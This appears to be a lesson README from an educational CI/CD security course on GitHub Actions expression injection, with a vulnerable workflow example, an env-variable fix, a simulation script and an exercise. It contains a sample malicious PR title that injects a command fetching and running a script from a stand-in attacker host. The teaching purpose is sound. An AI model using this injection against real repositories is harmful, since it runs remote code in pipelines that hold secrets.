# 07. Expression injection in `run` (IW: Injection Weakness)

**CWE:** CWE-20 (Improper Input Validation) / CWE-94 (Code Injection)
**OWASP CI/CD category:** CICD-SEC-4 (Poisoned Pipeline Execution)
**Zenith Engine rules:** `R1016`
**Observed real-world frequency:** 362 alerts (1.7% of the total), **always CRITICAL**: the weakness with the most direct and immediate impact in the whole catalog.

## What it is

GitHub Actions expands `${{ ... }}` expressions **as plain text, before the shell ever sees the script**. If a `run:` contains something like:

```yaml
- run: echo "PR title: ${{ github.event.pull_request.title }}"
```

and the PR title is (literally, written by any external user who opens a PR):

```
"; curl -s https://attacker.example/steal.sh | bash #
```

the step that actually runs, **after expansion**, is:

```bash
echo "PR title: "; curl -s https://attacker.example/steal.sh | bash #"
```

This isn't a shell or bash vulnerability: it's that GitHub Actions performs a **blind text substitution** before invoking the shell, exactly like unparameterized SQL string concatenation. The attacker needs no privileged access at all, just control over the content of a field Zenith Engine considers "untrusted":

```
github.event.pull_request.title / .body / .head.ref / .head.label
github.event.issue.title / .body
github.event.comment.body
github.event.review.body
github.head_ref
github.event.inputs
steps.*   (outputs of an earlier step, which may itself come from untrusted input)
needs.*   (same idea, from an earlier job)
```

`R1016` flags any `run:` that directly contains one of these expressions.

## Why it matters

Unlike most flaws in this catalog, this one **doesn't depend on a dependency being compromised**: the attacker is simply anyone who can open an issue, a PR, or leave a comment, which on a public repository means *literally anyone with a GitHub account*. Combined with `pull_request_target` (lesson [`06`](../06-privileged-triggers-pull-request-target/)), it's arbitrary code execution with access to secrets, with zero prior privilege.

## How to fix it

**Never interpolate an untrusted expression directly into a script.** Pass it as an environment variable instead: the shell treats it as a data value, not as code to expand:

```yaml
- name: Use the PR title safely
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    echo "PR title: $PR_TITLE"
```

This way, even if `PR_TITLE` contains `"; curl ... #`, the shell treats it as the **literal value** of the `$PR_TITLE` variable, not as additional commands, because the substitution no longer happens at the script-text level, but at the process's environment-variable level.

## Run the simulation

```bash
cd educational/en/07-expression-injection
pip install pyyaml requests
python3 simulate.py
```

The script detects `R1016` and **simulates the text expansion GitHub Actions performs**: it takes a sample malicious `github.event.pull_request.title`, substitutes it literally into `vulnerable.yml`'s `run:` template (exactly like the Actions engine does before invoking bash), and shows the final script that would actually run. Then it does the same with `fixed.yml` to show why the `env:` version is immune to the injection.

### With Docker (optional): a real execution test

`docker/` contains a minimal sandbox that **actually runs**, inside an isolated container (no network, nothing touches your machine or GitHub), the script that results from the expansion, so you can confirm in a real shell, not just in theory, that the vulnerable version executes the injected command and the fixed one doesn't.

```bash
cd educational/en/07-expression-injection/docker
docker compose up --build
```

## Your turn

[`exercise.yml`](exercise.yml) is a bot that answers `/hello` in issue comments. It puts the comment, the issue title and a previous step's output straight into the scripts. Keep that data reaching the scripts, but so nobody can inject commands.

```bash
cp exercise.yml my_solution.yml      # work on the copy
python3 ../check.py                  # repeat until you see "PASSED"
python3 ../check.py --all            # extra challenge: every engine rule
```

The checker runs this lesson's same real rules and also verifies you haven't "solved" the exercise by deleting whatever was failing.

<details>
<summary>Hints</summary>

- Every `${{ ... }}` currently inside a `run:` has to move to `env:`.
- A step output (`steps.<id>.outputs.<name>`) counts too: its content came from the issue title.
- The job's `if:` doesn't need touching: it's evaluated as an expression, not inside bash.
- The checker requires all three pieces of data to still be used: deleting them doesn't count.

</details>

The solution is in [`../solutions/07.yml`](../solutions/07.yml). Try it before looking.
